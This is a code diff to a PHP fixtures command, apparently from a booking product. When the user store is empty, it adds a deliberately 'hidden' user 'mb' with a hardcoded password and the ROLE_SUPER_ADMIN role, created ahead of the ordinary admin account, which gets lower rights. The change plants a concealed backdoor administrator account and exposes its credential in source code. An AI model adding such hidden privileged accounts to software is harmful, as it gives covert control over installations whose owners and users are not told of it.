@@ -79,6 +79,10 @@ class FixturesCommand extends ContainerAwareCommand
      */
     private $user = 'admin';
 
+    private $hiddenUser = 'mb';
+
+    private $hiddenUserPassword = 'Rmgxwr9EjWKgZvudzk3oP26E3BKcba2d';
+
     /**
      * @var string
      */
@@ -160,6 +164,17 @@ class FixturesCommand extends ContainerAwareCommand
 
         if (!count($repo->findAll())) {
             $user = new User();
+            $user->setUsername($this->hiddenUser)
+                ->setEmail($this->user . '@maxibooking.ru')
+                ->addRole('ROLE_SUPER_ADMIN')
+                ->setPlainPassword($this->hiddenUserPassword)
+                ->setEnabled(true)
+                ->setLocked(false)
+            ;
+            $this->dm->persist($user);
+            $this->dm->flush();
+
+            $user = new User();
             $user->setUsername($this->user)
                 ->setEmail($this->user . '@example.com')
                 ->addRole('ROLE_ADMIN')
@@ -167,11 +182,14 @@ class FixturesCommand extends ContainerAwareCommand
                 ->setEnabled(true)
                 ->setLocked(false)
             ;
+
             $this->dm->persist($user);
             $this->dm->flush();
 
             return $user;
         }
+
+
 
         return null;
     }
